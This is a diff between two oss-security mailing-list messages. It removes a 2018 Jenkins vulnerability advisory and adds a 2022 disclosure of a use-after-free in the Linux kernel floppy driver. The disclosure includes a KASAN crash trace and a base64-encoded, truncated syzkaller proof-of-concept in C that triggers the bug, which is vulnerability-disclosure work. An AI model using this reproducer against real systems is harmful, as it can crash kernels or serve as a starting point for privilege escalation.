@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["3270" "Wednesday" "10" "October" "2018" "17:11:42" "+0200" "Daniel Beck" "ml@beckweb.net" "<D95FAFFB-57B5-4D5A-BFF2-3A4F8F67320C@beckweb.net>" "88" "[oss-security] Multiple vulnerabilities in Jenkins" nil nil nil "10" "2018101015:11:42" "[oss-security] Multiple vulnerabilities in Jenkins" (number mark "U       ml@beckweb.n Oct 10   88/3270  " thread-indent "\"[oss-security] Multiple vulnerabilities in Jenkins\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 12129 invoked by uid 550); 10 Oct 2018 15:11:56 -0000
+Received: (qmail 7268 invoked by uid 550); 28 Apr 2022 08:36:27 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,105 +7,398 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 12108 invoked from network); 10 Oct 2018 15:11:55 -0000
-From: Daniel Beck <ml@beckweb.net>
-Content-Type: text/plain;
-	charset=us-ascii
-Content-Transfer-Encoding: 7bit
-Mime-Version: 1.0 (Mac OS X Mail 11.5 \(3445.9.1\))
-Message-Id: <D95FAFFB-57B5-4D5A-BFF2-3A4F8F67320C@beckweb.net>
-Date: Wed, 10 Oct 2018 17:11:42 +0200
+Received: (qmail 27950 invoked from network); 28 Apr 2022 03:20:33 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20210112;
+        h=mime-version:from:date:message-id:subject:to;
+        bh=DcusJc2+k/5PpIgeLXyIrSYGcm/4Bf0IUvNfADJFb3A=;
+        b=ctLEh6915Z3VyWQWvAy+V7AKLLcn5gjX/TB4hn22vyMxSQHUAvS0YKl2yUQ13Yo0Hj
+         BTNojpo6Vtph/tAP4mtOnksKbIgmJ3oBqHvUmMivGb4Fb9b7Vf1a4Qb9elRhHpu77rIC
+         ubWnT/Znui95xtSGeqDB9/RnmoLXv9d+ZeYJH3pRaVxI/ilVhal7TPdnVb3zuZmbHO6V
+         TP/kRHekbNDzzYEXGK+lutPb9ltPO7I+sQI5MXpSHzmEm6QUrnup/Ay43u1nVg5gEIVP
+         oH3hnOHnTYsXelUyXv8I8nKBZ9BnSM1LoqMWxFB1T4/EnHCIMsNQVyLZ/AOTszt2yL1Z
+         i7Ag==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20210112;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
+        bh=DcusJc2+k/5PpIgeLXyIrSYGcm/4Bf0IUvNfADJFb3A=;
+        b=QBiQPIX6TRpLiQZMxvkktWgrRpxLt1MkGbDhVLr6gGBs3MWqAMLK1OO4dkFxa/iS06
+         NOyM3K7Xl2ASZMV4cG76WUKQurLYn7yNwcjUIRUdOyqx2xYC+46qaR0atHIpB3wr5fB5
+         Bfhdb728ODcWwugl1IoVvJrDHM5b+ZAFMDRfoOJJE0sU8PQ+3/K+mjhNjBj1PtvV2pDv
+         3+sHRrVYe7biwoyj5Sgjc9NtvxvPaqNrmqR9vV2ZtRwyT+y2/GaF8TT2rlSN0eQ46Oc9
+         KOh8G/oZm4VB//Wl9LJD9ME7kxLti6w1pc4zj8GRs2S9StqX/nVVy8Z2z0v0AndFHG2f
+         ldhg==
+X-Gm-Message-State: AOAM5323m9JQZmi+vSCekIfrj8qvUJ/9Alr4p/5sC2DyV3H3qlpjlT6t
+	8lS1AbYGjs8y2+ILwonx9Ba8IJda26TMCJZHZCwcXDArWBGALlwG
+X-Google-Smtp-Source: ABdhPJzLfyqt+SBE5dywaX00svQvwMZ7hrv0TA1WNsSjwKfOkMbccUofFIQQ1npG1MYabYqpLQ0UWs3YRC3QXs+s+04=
+X-Received: by 2002:a0d:cbce:0:b0:2f8:29f6:2839 with SMTP id
+ n197-20020a0dcbce000000b002f829f62839mr10539281ywd.89.1651116021960; Wed, 27
+ Apr 2022 20:20:21 -0700 (PDT)
+MIME-Version: 1.0
+From: Minh Yuan <yuanmingbuaa@gmail.com>
+Date: Thu, 28 Apr 2022 11:19:46 +0800
+Message-ID: <CAH5WSp4X9ZRsgV_NWt8tT1OGxa45MrKDTOikHtnkc78XO5MaxA@mail.gmail.com>
 To: oss-security@lists.openwall.com
-X-Mailer: Apple Mail (2.3445.9.1)
-X-bounce-key: webpack.hosteurope.de;ml@beckweb.net;1539184315;195d846b;
-X-HE-SMSGID: 1gAG9H-0005oz-SU
-Subject: [oss-security] Multiple vulnerabilities in Jenkins
+Content-Type: multipart/mixed; boundary="000000000000f8f89e05ddae67d8"
+Subject: [oss-security] Linux kernel: A concurrency use-after-free in floppy's raw_cmd
 
-Jenkins is an open source automation server which enables developers around
-the world to reliably build, test, and deploy their software. The following
-releases contain fixes for security vulnerabilities:
+--000000000000f8f89e05ddae67d8
+Content-Type: multipart/alternative; boundary="000000000000f8f89c05ddae67d6"
 
-* Jenkins weekly 2.146
-* Jenkins LTS 2.138.2
+--000000000000f8f89c05ddae67d6
+Content-Type: text/plain; charset="UTF-8"
 
-Summaries of the vulnerabilities are below. More details, severity, and
-attribution can be found here:
-https://jenkins.io/security/advisory/2018-10-10/
+Hi,
 
-We provide advance notification for security updates on this mailing list:
-https://groups.google.com/d/forum/jenkinsci-advisories
+We recently discovered a concurrency uaf between raw_cmd_ioctl and
+seek_interrupt in the latest kernel version (5.17.4 for now).
 
-If you discover security vulnerabilities in Jenkins, please report them as
-described here:
-https://jenkins.io/security/#reporting-vulnerabilities
+The root cause is that after deallocating raw_cmd in raw_cmd_ioctl,
+seek_interrupt still holds the freed raw_cmd and accesses it in
+floppy_ready or start_motor concurrently.
 
----
+PoC (generated by syzkaller) is in the attachment, and here is the KASAN
+report:
 
-SECURITY-867
-A path traversal vulnerability in Stapler allowed viewing routable objects 
-with views defined on any type. This could be used to access internal data 
-of routable objects, e.g. by showing their string representation (#toString).
+BUG: KASAN: use-after-free in start_motor+0x31b/0x3f0
+drivers/block/floppy.c:1908
+
+Read of size 4 at addr ffff888127331c00 by task kworker/u16:9/15911
+
+CPU: 5 PID: 15911 Comm: kworker/u16:9 Not tainted 5.16.2 #20
+Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS
+rel-1.13.0-0-gf21b5a4aeb02-prebuilt.qemu.org 04/01/2014
+Workqueue: floppy floppy_work_workfn
+Call Trace:
+ <TASK>
+ __dump_stack lib/dump_stack.c:88 [inline]
+ dump_stack_lvl+0xcd/0x134 lib/dump_stack.c:106
+ print_address_description.constprop.0.cold+0x8d/0x320 mm/kasan/report.c:247
+ __kasan_report mm/kasan/report.c:433 [inline]
+ kasan_report.cold+0x83/0xdf mm/kasan/report.c:450
+ start_motor+0x31b/0x3f0 drivers/block/floppy.c:1908
+ floppy_ready+0x83/0x1850 drivers/block/floppy.c:1935
+ seek_interrupt+0x326/0x420 drivers/block/floppy.c:1567
+ process_one_work+0x9b2/0x1660 kernel/workqueue.c:2317
+ worker_thread+0x65d/0x1130 kernel/workqueue.c:2465
+ kthread+0x405/0x4f0 kernel/kthread.c:327
+ ret_from_fork+0x1f/0x30 arch/x86/entry/entry_64.S:295
+ </TASK>
+
+Allocated by task 22033:
+ kasan_save_stack+0x1e/0x50 mm/kasan/common.c:38
+ kasan_set_track mm/kasan/common.c:46 [inline]
+ set_alloc_info mm/kasan/common.c:434 [inline]
+ ____kasan_kmalloc mm/kasan/common.c:513 [inline]
+ ____kasan_kmalloc mm/kasan/common.c:472 [inline]
+ __kasan_kmalloc+0xa9/0xd0 mm/kasan/common.c:522
+ kmalloc include/linux/slab.h:590 [inline]
+ raw_cmd_copyin drivers/block/floppy.c:3100 [inline]
+ raw_cmd_ioctl drivers/block/floppy.c:3167 [inline]
+ fd_locked_ioctl+0x100e/0x2820 drivers/block/floppy.c:3535
+ fd_ioctl+0x35/0x50 drivers/block/floppy.c:3562
+ blkdev_ioctl+0x37a/0x800 block/ioctl.c:609
+ vfs_ioctl fs/ioctl.c:51 [inline]
+ __do_sys_ioctl fs/ioctl.c:874 [inline]
+ __se_sys_ioctl fs/ioctl.c:860 [inline]
+ __x64_sys_ioctl+0x193/0x200 fs/ioctl.c:860
+ do_syscall_x64 arch/x86/entry/common.c:50 [inline]
+ do_syscall_64+0x35/0x80 arch/x86/entry/common.c:80
+ entry_SYSCALL_64_after_hwframe+0x44/0xae
+
+Freed by task 22033:
+ kasan_save_stack+0x1e/0x50 mm/kasan/common.c:38
+ kasan_set_track+0x21/0x30 mm/kasan/common.c:46
+ kasan_set_free_info+0x20/0x30 mm/kasan/generic.c:370
+ ____kasan_slab_free mm/kasan/common.c:366 [inline]
+ ____kasan_slab_free mm/kasan/common.c:328 [inline]
+ __kasan_slab_free+0xff/0x130 mm/kasan/common.c:374
+ kasan_slab_free include/linux/kasan.h:235 [inline]
+ slab_free_hook mm/slub.c:1723 [inline]
+ slab_free_freelist_hook+0x8b/0x1c0 mm/slub.c:1749
+ slab_free mm/slub.c:3513 [inline]
+ kfree+0xf6/0x560 mm/slub.c:4561
+ raw_cmd_free+0x8a/0x1c0 drivers/block/floppy.c:3086
+ raw_cmd_ioctl drivers/block/floppy.c:3187 [inline]
+ fd_locked_ioctl+0x206d/0x2820 drivers/block/floppy.c:3535
+ fd_ioctl+0x35/0x50 drivers/block/floppy.c:3562
+ blkdev_ioctl+0x37a/0x800 block/ioctl.c:609
+ vfs_ioctl fs/ioctl.c:51 [inline]
+ __do_sys_ioctl fs/ioctl.c:874 [inline]
+ __se_sys_ioctl fs/ioctl.c:860 [inline]
+ __x64_sys_ioctl+0x193/0x200 fs/ioctl.c:860
+ do_syscall_x64 arch/x86/entry/common.c:50 [inline]
+ do_syscall_64+0x35/0x80 arch/x86/entry/common.c:80
+ entry_SYSCALL_64_after_hwframe+0x44/0xae
 
 
-SECURITY-1074
-Users with Job/Configure permission could specify a relative path escaping 
-the base directory in the file name portion of a file parameter definition. 
-This path would be used to archive the uploaded file on the Jenkins master, 
-resulting in an arbitrary file write vulnerability.
+The new patch can been seen at
+https://github.com/torvalds/linux/commit/233087ca063686964a53c829d547c7571e3f67bf
+.
 
-File parameters that escape the base directory are no longer accepted and 
-the build will fail.
+Regards,
 
+Yuan Ming from Tsinghua University
 
-SECURITY-1129
-The wrapper query parameter for the XML variant of the Jenkins remote API 
-did not validate the specified tag name. This resulted in a reflected cross-
-site scripting vulnerability.
+--000000000000f8f89c05ddae67d6
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
 
-Only legal XML tag names are now allowed for the wrapper query parameter.
+<div dir=3D"ltr">Hi,<div><br><div>We recently discovered a concurrency uaf =
+between=C2=A0raw_cmd_ioctl and seek_interrupt in the latest kernel version =
+(5.17.4 for now).</div><div><br></div><div>The root cause is that after=C2=
+=A0deallocating=C2=A0<span style=3D"color:rgb(0,0,0);font-family:Menlo,Mona=
+co,&quot;Courier New&quot;,monospace;font-size:12px;white-space:pre-wrap">r=
+aw_cmd in </span>raw_cmd_ioctl, seek_interrupt still holds the freed=C2=A0<=
+span style=3D"color:rgb(0,0,0);font-family:Menlo,Monaco,&quot;Courier New&q=
+uot;,monospace;font-size:12px;white-space:pre-wrap">raw_cmd and accesses it=
+ in floppy_ready or </span>start_motor concurrently.</div><div><br></div><d=
+iv>PoC (generated by syzkaller) is in the attachment, and here is the KASAN=
+ report:</div><div><br></div><div><span style=3D"color:rgb(0,0,0);white-spa=
+ce:pre-wrap">BUG: KASAN: use-after-free in start_motor+0x31b/0x3f0 drivers/=
+block/floppy.c:1908</span><br></div><div><pre style=3D"white-space:pre-wrap=
+;color:rgb(0,0,0)">Read of size 4 at addr ffff888127331c00 by task kworker/=
+u16:9/15911
 
+CPU: 5 PID: 15911 Comm: kworker/u16:9 Not tainted 5.16.2 #20
+Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS <a href=3D"http=
+://rel-1.13.0-0-gf21b5a4aeb02-prebuilt.qemu.org/" target=3D"_blank">rel-1.1=
+3.0-0-gf21b5a4aeb02-prebuilt.qemu.org</a> 04/01/2014
+Workqueue: floppy floppy_work_workfn
+Call Trace:
+ &lt;TASK&gt;
+ __dump_stack lib/dump_stack.c:88 [inline]
+ dump_stack_lvl+0xcd/0x134 lib/dump_stack.c:106
+ print_address_description.constprop.0.cold+0x8d/0x320 mm/kasan/report.c:247
+ __kasan_report mm/kasan/report.c:433 [inline]
+ kasan_report.cold+0x83/0xdf mm/kasan/report.c:450
+ start_motor+0x31b/0x3f0 drivers/block/floppy.c:1908
+ floppy_ready+0x83/0x1850 drivers/block/floppy.c:1935
+ seek_interrupt+0x326/0x420 drivers/block/floppy.c:1567
+ process_one_work+0x9b2/0x1660 kernel/workqueue.c:2317
+ worker_thread+0x65d/0x1130 kernel/workqueue.c:2465
+ kthread+0x405/0x4f0 kernel/kthread.c:327
+ ret_from_fork+0x1f/0x30 arch/x86/entry/entry_64.S:295
+ &lt;/TASK&gt;
 
-SECURITY-1162 / CVE-2018-1999043
-When attempting to authenticate using API token, an ephemeral user record 
-was created to validate the token in case an external security realm was 
-used, and the user record in Jenkins not previously saved, as (legacy) API 
-tokens could exist without a persisted user record.
+Allocated by task 22033:
+ kasan_save_stack+0x1e/0x50 mm/kasan/common.c:38
+ kasan_set_track mm/kasan/common.c:46 [inline]
+ set_alloc_info mm/kasan/common.c:434 [inline]
+ ____kasan_kmalloc mm/kasan/common.c:513 [inline]
+ ____kasan_kmalloc mm/kasan/common.c:472 [inline]
+ __kasan_kmalloc+0xa9/0xd0 mm/kasan/common.c:522
+ kmalloc include/linux/slab.h:590 [inline]
+ raw_cmd_copyin drivers/block/floppy.c:3100 [inline]
+ raw_cmd_ioctl drivers/block/floppy.c:3167 [inline]
+ fd_locked_ioctl+0x100e/0x2820 drivers/block/floppy.c:3535
+ fd_ioctl+0x35/0x50 drivers/block/floppy.c:3562
+ blkdev_ioctl+0x37a/0x800 block/ioctl.c:609
+ vfs_ioctl fs/ioctl.c:51 [inline]
+ __do_sys_ioctl fs/ioctl.c:874 [inline]
+ __se_sys_ioctl fs/ioctl.c:860 [inline]
+ __x64_sys_ioctl+0x193/0x200 fs/ioctl.c:860
+ do_syscall_x64 arch/x86/entry/common.c:50 [inline]
+ do_syscall_64+0x35/0x80 arch/x86/entry/common.c:80
+ entry_SYSCALL_64_after_hwframe+0x44/0xae
 
-This behavior could be abused to create a large number of ephemeral user 
-records in memory.
+Freed by task 22033:
+ kasan_save_stack+0x1e/0x50 mm/kasan/common.c:38
+ kasan_set_track+0x21/0x30 mm/kasan/common.c:46
+ kasan_set_free_info+0x20/0x30 mm/kasan/generic.c:370
+ ____kasan_slab_free mm/kasan/common.c:366 [inline]
+ ____kasan_slab_free mm/kasan/common.c:328 [inline]
+ __kasan_slab_free+0xff/0x130 mm/kasan/common.c:374
+ kasan_slab_free include/linux/kasan.h:235 [inline]
+ slab_free_hook mm/slub.c:1723 [inline]
+ slab_free_freelist_hook+0x8b/0x1c0 mm/slub.c:1749
+ slab_free mm/slub.c:3513 [inline]
+ kfree+0xf6/0x560 mm/slub.c:4561
+ raw_cmd_free+0x8a/0x1c0 drivers/block/floppy.c:3086
+ raw_cmd_ioctl drivers/block/floppy.c:3187 [inline]
+ fd_locked_ioctl+0x206d/0x2820 drivers/block/floppy.c:3535
+ fd_ioctl+0x35/0x50 drivers/block/floppy.c:3562
+ blkdev_ioctl+0x37a/0x800 block/ioctl.c:609
+ vfs_ioctl fs/ioctl.c:51 [inline]
+ __do_sys_ioctl fs/ioctl.c:874 [inline]
+ __se_sys_ioctl fs/ioctl.c:860 [inline]
+ __x64_sys_ioctl+0x193/0x200 fs/ioctl.c:860
+ do_syscall_x64 arch/x86/entry/common.c:50 [inline]
+ do_syscall_64+0x35/0x80 arch/x86/entry/common.c:80
+ entry_SYSCALL_64_after_hwframe+0x44/0xae</pre></div><div><br></div><div>Th=
+e new patch can been seen at=C2=A0<a href=3D"https://github.com/torvalds/li=
+nux/commit/233087ca063686964a53c829d547c7571e3f67bf">https://github.com/tor=
+valds/linux/commit/233087ca063686964a53c829d547c7571e3f67bf</a>.</div><div>=
+<br></div><div><div>Regards,</div><div>=C2=A0<br></div><div>Yuan Ming from =
+Tsinghua University</div></div></div></div>
 
-This is the same vulnerability as SECURITY-672. The fix for SECURITY-672 
-was previously incorrectly applied and therefore not effective. This has 
-been fixed.
+--000000000000f8f89c05ddae67d6--
 
+--000000000000f8f89e05ddae67d8
+Content-Type: application/octet-stream; name="floppy_poc.c"
+Content-Disposition: attachment; filename="floppy_poc.c"
+Content-Transfer-Encoding: base64
+Content-ID: <f_l2iftpsq0>
+X-Attachment-Id: f_l2iftpsq0
 
-SECURITY-1128
-By accessing a specific crafted URL on Jenkins instances using Jenkins' own 
-user database, users without Overall/Read access could create ephemeral 
-user records.
+I2luY2x1ZGUgPGRpcmVudC5oPgojaW5jbHVkZSA8ZW5kaWFuLmg+CiNpbmNs
+dWRlIDxlcnJuby5oPgojaW5jbHVkZSA8ZmNudGwuaD4KI2luY2x1ZGUgPHB0
+aHJlYWQuaD4KI2luY2x1ZGUgPHNpZ25hbC5oPgojaW5jbHVkZSA8c3RkYXJn
+Lmg+CiNpbmNsdWRlIDxzdGRib29sLmg+CiNpbmNsdWRlIDxzdGRpbnQuaD4K
+I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1
+ZGUgPHN0cmluZy5oPgojaW5jbHVkZSA8c3lzL3ByY3RsLmg+CiNpbmNsdWRl
+IDxzeXMvc3RhdC5oPgojaW5jbHVkZSA8c3lzL3N5c2NhbGwuaD4KI2luY2x1
+ZGUgPHN5cy90eXBlcy5oPgojaW5jbHVkZSA8c3lzL3dhaXQuaD4KI2luY2x1
+ZGUgPHRpbWUuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgoKI2luY2x1ZGUgPGxp
+bnV4L2Z1dGV4Lmg+CgpzdGF0aWMgdm9pZCBzbGVlcF9tcyh1aW50NjRfdCBt
+cykKewogIHVzbGVlcChtcyAqIDEwMDApOwp9CgpzdGF0aWMgdWludDY0X3Qg
+Y3VycmVudF90aW1lX21zKHZvaWQpCnsKICBzdHJ1Y3QgdGltZXNwZWMgdHM7
+CiAgaWYgKGNsb2NrX2dldHRpbWUoQ0xPQ0tfTU9OT1RPTklDLCAmdHMpKQog
+ICAgZXhpdCgxKTsKICByZXR1cm4gKHVpbnQ2NF90KXRzLnR2X3NlYyAqIDEw
+MDAgKyAodWludDY0X3QpdHMudHZfbnNlYyAvIDEwMDAwMDA7Cn0KCnN0YXRp
+YyB2b2lkIHRocmVhZF9zdGFydCh2b2lkKiAoKmZuKSh2b2lkKiksIHZvaWQq
+IGFyZykKewogIHB0aHJlYWRfdCB0aDsKICBwdGhyZWFkX2F0dHJfdCBhdHRy
+OwogIHB0aHJlYWRfYXR0cl9pbml0KCZhdHRyKTsKICBwdGhyZWFkX2F0dHJf
+c2V0c3RhY2tzaXplKCZhdHRyLCAxMjggPDwgMTApOwogIGludCBpID0gMDsK
+ICBmb3IgKDsgaSA8IDEwMDsgaSsrKSB7CiAgICBpZiAocHRocmVhZF9jcmVh
+dGUoJnRoLCAmYXR0ciwgZm4sIGFyZykgPT0gMCkgewogICAgICBwdGhyZWFk
+X2F0dHJfZGVzdHJveSgmYXR0cik7CiAgICAgIHJldHVybjsKICAgIH0KICAg
+IGlmIChlcnJubyA9PSBFQUdBSU4pIHsKICAgICAgdXNsZWVwKDUwKTsKICAg
+ICAgY29udGludWU7CiAgICB9CiAgICBicmVhazsKICB9CiAgZXhpdCgxKTsK
+fQoKdHlwZWRlZiBzdHJ1Y3QgewogIGludCBzdGF0ZTsKfSBldmVudF90OwoK
+c3RhdGljIHZvaWQgZXZlbnRfaW5pdChldmVudF90KiBldikKewogIGV2LT5z
+dGF0ZSA9IDA7Cn0KCnN0YXRpYyB2b2lkIGV2ZW50X3Jlc2V0KGV2ZW50X3Qq
+IGV2KQp7CiAgZXYtPnN0YXRlID0gMDsKfQoKc3RhdGljIHZvaWQgZXZlbnRf
+c2V0KGV2ZW50X3QqIGV2KQp7CiAgaWYgKGV2LT5zdGF0ZSkKICAgIGV4aXQo
+MSk7CiAgX19hdG9taWNfc3RvcmVfbigmZXYtPnN0YXRlLCAxLCBfX0FUT01J
+Q19SRUxFQVNFKTsKICBzeXNjYWxsKFNZU19mdXRleCwgJmV2LT5zdGF0ZSwg
+RlVURVhfV0FLRSB8IEZVVEVYX1BSSVZBVEVfRkxBRywgMTAwMDAwMCk7Cn0K
+CnN0YXRpYyB2b2lkIGV2ZW50X3dhaXQoZXZlbnRfdCogZXYpCnsKICB3aGls
+ZSAoIV9fYXRvbWljX2xvYWRfbigmZXYtPnN0YXRlLCBfX0FUT01JQ19BQ1FV
+SVJFKSkKICAgIHN5c2NhbGwoU1lTX2Z1dGV4LCAmZXYtPnN0YXRlLCBGVVRF
+WF9XQUlUIHwgRlVURVhfUFJJVkFURV9GTEFHLCAwLCAwKTsKfQoKc3RhdGlj
+IGludCBldmVudF9pc3NldChldmVudF90KiBldikKewogIHJldHVybiBfX2F0
+b21pY19sb2FkX24oJmV2LT5zdGF0ZSwgX19BVE9NSUNfQUNRVUlSRSk7Cn0K
+CnN0YXRpYyBpbnQgZXZlbnRfdGltZWR3YWl0KGV2ZW50X3QqIGV2LCB1aW50
+NjRfdCB0aW1lb3V0KQp7CiAgdWludDY0X3Qgc3RhcnQgPSBjdXJyZW50X3Rp
+bWVfbXMoKTsKICB1aW50NjRfdCBub3cgPSBzdGFydDsKICBmb3IgKDs7KSB7
+CiAgICB1aW50NjRfdCByZW1haW4gPSB0aW1lb3V0IC0gKG5vdyAtIHN0YXJ0
+KTsKICAgIHN0cnVjdCB0aW1lc3BlYyB0czsKICAgIHRzLnR2X3NlYyA9IHJl
+bWFpbiAvIDEwMDA7CiAgICB0cy50dl9uc2VjID0gKHJlbWFpbiAlIDEwMDAp
+ICogMTAwMCAqIDEwMDA7CiAgICBzeXNjYWxsKFNZU19mdXRleCwgJmV2LT5z
+dGF0ZSwgRlVURVhfV0FJVCB8IEZVVEVYX1BSSVZBVEVfRkxBRywgMCwgJnRz
+KTsKICAgIGlmIChfX2F0b21pY19sb2FkX24oJmV2LT5zdGF0ZSwgX19BVE9N
+SUNfQUNRVUlSRSkpCiAgICAgIHJldHVybiAxOwogICAgbm93ID0gY3VycmVu
+dF90aW1lX21zKCk7CiAgICBpZiAobm93IC0gc3RhcnQgPiB0aW1lb3V0KQog
+ICAgICByZXR1cm4gMDsKICB9Cn0KCnN0YXRpYyBib29sIHdyaXRlX2ZpbGUo
+Y29uc3QgY2hhciogZmlsZSwgY29uc3QgY2hhciogd2hhdCwgLi4uKQp7CiAg
+Y2hhciBidWZbMTAyNF07CiAgdmFfbGlzdCBhcmdzOwogIHZhX3N0YXJ0KGFy
+Z3MsIHdoYXQpOwogIHZzbnByaW50ZihidWYsIHNpemVvZihidWYpLCB3aGF0
+LCBhcmdzKTsKICB2YV9lbmQoYXJncyk7CiAgYnVmW3NpemVvZihidWYpIC0g
+MV0gPSAwOwogIGludCBsZW4gPSBzdHJsZW4oYnVmKTsKICBpbnQgZmQgPSBv
+cGVuKGZpbGUsIE9fV1JPTkxZIHwgT19DTE9FWEVDKTsKICBpZiAoZmQgPT0g
+LTEpCiAgICByZXR1cm4gZmFsc2U7CiAgaWYgKHdyaXRlKGZkLCBidWYsIGxl
+bikgIT0gbGVuKSB7CiAgICBpbnQgZXJyID0gZXJybm87CiAgICBjbG9zZShm
+ZCk7CiAgICBlcnJubyA9IGVycjsKICAgIHJldHVybiBmYWxzZTsKICB9CiAg
+Y2xvc2UoZmQpOwogIHJldHVybiB0cnVlOwp9CgpzdGF0aWMgbG9uZyBzeXpf
+b3Blbl9kZXYodm9sYXRpbGUgbG9uZyBhMCwgdm9sYXRpbGUgbG9uZyBhMSwg
+dm9sYXRpbGUgbG9uZyBhMikKewogIGlmIChhMCA9PSAweGMgfHwgYTAgPT0g
+MHhiKSB7CiAgICBjaGFyIGJ1ZlsxMjhdOwogICAgc3ByaW50ZihidWYsICIv
+ZGV2LyVzLyVkOiVkIiwgYTAgPT0gMHhjID8gImNoYXIiIDogImJsb2NrIiwg
+KHVpbnQ4X3QpYTEsCiAgICAgICAgICAgICh1aW50OF90KWEyKTsKICAgIHJl
+dHVybiBvcGVuKGJ1ZiwgT19SRFdSLCAwKTsKICB9IGVsc2UgewogICAgY2hh
+ciBidWZbMTAyNF07CiAgICBjaGFyKiBoYXNoOwogICAgc3RybmNweShidWYs
+IChjaGFyKilhMCwgc2l6ZW9mKGJ1ZikgLSAxKTsKICAgIGJ1ZltzaXplb2Yo
+YnVmKSAtIDFdID0gMDsKICAgIHdoaWxlICgoaGFzaCA9IHN0cmNocihidWYs
+ICcjJykpKSB7CiAgICAgICpoYXNoID0gJzAnICsgKGNoYXIpKGExICUgMTAp
+OwogICAgICBhMSAvPSAxMDsKICAgIH0KICAgIHJldHVybiBvcGVuKGJ1Ziwg
+YTIsIDApOwogIH0KfQoKc3RhdGljIHZvaWQga2lsbF9hbmRfd2FpdChpbnQg
+cGlkLCBpbnQqIHN0YXR1cykKewogIGtpbGwoLXBpZCwgU0lHS0lMTCk7CiAg
+a2lsbChwaWQsIFNJR0tJTEwpOwogIGZvciAoaW50IGkgPSAwOyBpIDwgMTAw
+OyBpKyspIHsKICAgIGlmICh3YWl0cGlkKC0xLCBzdGF0dXMsIFdOT0hBTkcg
+fCBfX1dBTEwpID09IHBpZCkKICAgICAgcmV0dXJuOwogICAgdXNsZWVwKDEw
+MDApOwogIH0KICBESVIqIGRpciA9IG9wZW5kaXIoIi9zeXMvZnMvZnVzZS9j
+b25uZWN0aW9ucyIpOwogIGlmIChkaXIpIHsKICAgIGZvciAoOzspIHsKICAg
+ICAgc3RydWN0IGRpcmVudCogZW50ID0gcmVhZGRpcihkaXIpOwogICAgICBp
+ZiAoIWVudCkKICAgICAgICBicmVhazsKICAgICAgaWYgKHN0cmNtcChlbnQt
+PmRfbmFtZSwgIi4iKSA9PSAwIHx8IHN0cmNtcChlbnQtPmRfbmFtZSwgIi4u
+IikgPT0gMCkKICAgICAgICBjb250aW51ZTsKICAgICAgY2hhciBhYm9ydFsz
+MDBdOwogICAgICBzbnByaW50ZihhYm9ydCwgc2l6ZW9mKGFib3J0KSwgIi9z
+eXMvZnMvZnVzZS9jb25uZWN0aW9ucy8lcy9hYm9ydCIsCiAgICAgICAgICAg
+ICAgIGVudC0+ZF9uYW1lKTsKICAgICAgaW50IGZkID0gb3BlbihhYm9ydCwg
+T19XUk9OTFkpOwogICAgICBpZiAoZmQgPT0gLTEpIHsKICAgICAgICBjb250
+aW51ZTsKICAgICAgfQogICAgICBpZiAod3JpdGUoZmQsIGFib3J0LCAxKSA8
+IDApIHsKICAgICAgfQogICAgICBjbG9zZShmZCk7CiAgICB9CiAgICBjbG9z
+ZWRpcihkaXIpOwogIH0gZWxzZSB7CiAgfQogIHdoaWxlICh3YWl0cGlkKC0x
+LCBzdGF0dXMsIF9fV0FMTCkgIT0gcGlkKSB7CiAgfQp9CgpzdGF0aWMgdm9p
+ZCBzZXR1cF90ZXN0KCkKewogIHByY3RsKFBSX1NFVF9QREVBVEhTSUcsIFNJ
+R0tJTEwsIDAsIDAsIDApOwogIHNldHBncnAoKTsKICB3cml0ZV9maWxlKCIv
+cHJvYy9zZWxmL29vbV9zY29yZV9hZGoiLCAiMTAwMCIpOwp9CgpzdHJ1Y3Qg
+dGhyZWFkX3QgewogIGludCBjcmVhdGVkLCBjYWxsOwogIGV2ZW50X3QgcmVh
+ZHksIGRvbmU7Cn07CgpzdGF0aWMgc3RydWN0IHRocmVhZF90IHRocmVhZHNb
+MTZdOwpzdGF0aWMgdm9pZCBleGVjdXRlX2NhbGwoaW50IGNhbGwpOwpzdGF0
+aWMgaW50IHJ1bm5pbmc7CgpzdGF0aWMgdm9pZCogdGhyKHZvaWQqIGFyZykK
+ewogIHN0cnVjdCB0aHJlYWRfdCogdGggPSAoc3RydWN0IHRocmVhZF90Kilh
+cmc7CiAgZm9yICg7OykgewogICAgZXZlbnRfd2FpdCgmdGgtPnJlYWR5KTsK
+ICAgIGV2ZW50X3Jlc2V0KCZ0aC0+cmVhZHkpOwogICAgZXhlY3V0ZV9jYWxs
+KHRoLT5jYWxsKTsKICAgIF9fYXRvbWljX2ZldGNoX3N1YigmcnVubmluZywg
+MSwgX19BVE9NSUNfUkVMQVhFRCk7CiAgICBldmVudF9zZXQoJnRoLT5kb25l
+KTsKICB9CiAgcmV0dXJuIDA7Cn0KCnN0YXRpYyB2b2lkIGV4ZWN1dGVfb25l
+KHZvaWQpCnsKICBpbnQgaSwgY2FsbCwgdGhyZWFkOwogIGZvciAoY2FsbCA9
+IDA7IGNhbGwgPCAyOyBjYWxsKyspIHsKICAgIGZvciAodGhyZWFkID0gMDsg
+dGhyZWFkIDwgKGludCkoc2l6ZW9mKHRocmVhZHMpIC8gc2l6ZW9mKHRocmVh
+ZHNbMF0pKTsKICAgICAgICAgdGhyZWFkKyspIHsKICAgICAgc3RydWN0IHRo
